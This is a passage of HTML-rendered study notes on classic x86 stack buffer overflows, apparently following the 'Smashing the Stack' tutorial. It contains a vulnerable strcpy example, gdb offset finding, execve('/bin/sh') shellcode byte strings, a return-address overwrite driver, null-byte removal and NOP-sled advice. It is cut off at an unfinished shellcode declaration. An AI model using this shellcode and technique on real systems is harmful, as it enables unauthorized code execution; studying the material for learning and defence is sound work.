&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;strcpy&lt;/span&gt;(buffer, arv[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What happens when the buffer length &amp;lt; than the first argument?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;check_signature&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *str, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; j) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; user_signature[&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;strcpy&lt;/span&gt;(user_signature, str);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#447fcf&#34;&gt;isValid&lt;/span&gt;(user_signature));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    i = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// main FRAME
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// check_signature FRAME
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;j
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;amp;str                                                          FP + &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Return &lt;span style=&#34;color:#447fcf&#34;&gt;Address&lt;/span&gt; (RA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Old Frame &lt;span style=&#34;color:#447fcf&#34;&gt;Pointer&lt;/span&gt; (FP)                           &amp;amp;larr;--- FRAME POINTER HERE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;............
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Padding
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;............
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Value of i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user_signature[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user_signature[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When a function call returns, the OLD FP and local variables of its stack are popped but the args and RA are kept since it&amp;rsquo;s part of its parent&amp;rsquo;s local variables.&lt;/p&gt;
&lt;p&gt;Str = &amp;ldquo;randomStringLongerThan24Bytes&amp;rdquo;&lt;/p&gt;
&lt;p&gt;We can use &lt;code&gt;\xbf...&lt;/code&gt; to overwrite the return addresses such that the function and program returns to another part. We can also set that &lt;code&gt;i = 1&lt;/code&gt; through.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Crash reasons
&lt;ul&gt;
&lt;li&gt;overwritten RA to an invalid address&lt;/li&gt;
&lt;li&gt;unmapped virtual address&lt;/li&gt;
&lt;li&gt;valid address does not point to an instruction
&lt;ul&gt;
&lt;li&gt;Question: by is not an instruction, is that a raw data does not correspond to an instruction, or is it in the wrong part of the code?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;address content is off-limit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;details&gt;&lt;summary&gt;Smash the Stack&lt;/summary&gt;
&lt;p&gt;How did we know to add 8 to the return address?  We used a
test value first (for example 1), compiled the program, and then started gdb:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-gdb&#34; data-lang=&#34;gdb&#34;&gt;gdb example3
(gdb) disassemble main
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;0x8004b2 - 0x8004a8 = 8&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We want to spawn a shell and run arbitrary command&lt;/li&gt;
&lt;li&gt;We want to overwrite the buffer with code we want to run&lt;/li&gt;
&lt;li&gt;We want to set the return address to the address of the code we want to run&lt;/li&gt;
&lt;li&gt;Write code in hack.c, compile, and use gdb to get the code commands&lt;/li&gt;
&lt;li&gt;(gdb) disassemble main&lt;/li&gt;
&lt;li&gt;(gdb) disassemble __execve&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Template&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *name[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   name[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   name[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#447fcf&#34;&gt;execve&lt;/span&gt;(name[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], name, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;Have the null terminated string &amp;ldquo;/bin/sh&amp;rdquo; somewhere in memory.&lt;/li&gt;
&lt;li&gt;Have the address of the string &amp;ldquo;/bin/sh&amp;rdquo; somewhere in memory followed by a null long word.&lt;/li&gt;
&lt;li&gt;Copy 0xb into the EAX register.&lt;/li&gt;
&lt;li&gt;Copy the address of the address of the string &amp;ldquo;/bin/sh&amp;rdquo; into the EBX register.&lt;/li&gt;
&lt;li&gt;Copy the address of the string &amp;ldquo;/bin/sh&amp;rdquo; into the ECX register.&lt;/li&gt;
&lt;li&gt;Copy the address of the null long word into the EDX register.&lt;/li&gt;
&lt;li&gt;Execute the int $0x80 instruction.&lt;/li&gt;
&lt;li&gt;Copy 0x1 into the EAX register.&lt;/li&gt;
&lt;li&gt;Copy 0x0 into the EBX register.&lt;/li&gt;
&lt;li&gt;Execute the int $0x80 instruction.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We also want to add an exit(0) call to make sure things are fine&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#447fcf&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;want to make sure to not have null bytes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; shellcode[] =
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x80\xe8\xdc\xff\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;/bin/sh&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; large_string[&lt;span style=&#34;color:#3677a9&#34;&gt;128&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#3677a9&#34;&gt;96&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; *long_ptr = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; *) large_string;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;32&lt;/span&gt;; i++)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *(long_ptr + i) = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;) buffer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#447fcf&#34;&gt;strlen&lt;/span&gt;(shellcode); i++)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    large_string[i] = shellcode[i];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;strcpy&lt;/span&gt;(buffer,large_string);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-gdb&#34; data-lang=&#34;gdb&#34;&gt;(gdb) disassemble main
...End of assembler dump.
(gdb) x/bx main+3
0x8000133 &amp;lt;main+3&amp;gt;:     0xeb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Test your exploit. We also need to replace null bytes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; shellcode[] =
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *ret;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ret = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *)&amp;amp;ret + &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   (*ret) = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;)shellcode;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Problem instruction:                 Substitute with:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;movb   $0x0,0x7(%esi)                xorl   %eax,%eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    movl   %eax,0xc(%esi)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;movl   $0xb,%eax                     movb   $0xb,%al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;movl   $0x1, %eax                    xorl   %ebx,%ebx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;movl   $0x0, %ebx                    movl   %ebx,%eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    inc    %eax
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;How to print the stack pointer&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;get_sp&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#447fcf&#34;&gt;__asm__&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movl %esp,%eax&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;0x%x&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#447fcf&#34;&gt;get_sp&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since we don&amp;rsquo;t know where our code starts, we want to use a bunch of NOP (0x90), then put our code, then put the return addresses.&lt;/p&gt;
&lt;p&gt;We can also use Environment variables, in case the buffer is small.&lt;/p&gt;
&lt;p&gt;What to look for?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string.  gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF.  It performs no checks for buffer overflows.  The scanf() family of functions can also be a problem if you are matching a sequence of non-white-space characters (%s), or matching a non-empty sequence of characters from a specified set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width.  If the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good posibility that you might be able to exploit a buffer overflow.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Another usual programming construct we find is the use of a while loop to read one character at a time into a buffer from stdin or some file until the end of line, end of file, or some other delimiter is reached.  This type of construct usually uses one of these functions: getc(), fgetc(), or getchar(). If there is no explicit checks for overflows in the while loop, such programs are easily exploited.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// shellcode.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#if defined(__i386__) &amp;amp;&amp;amp; defined(__linux__)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#define NOP_SIZE	1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; nop[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x90&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; shellcode[] =
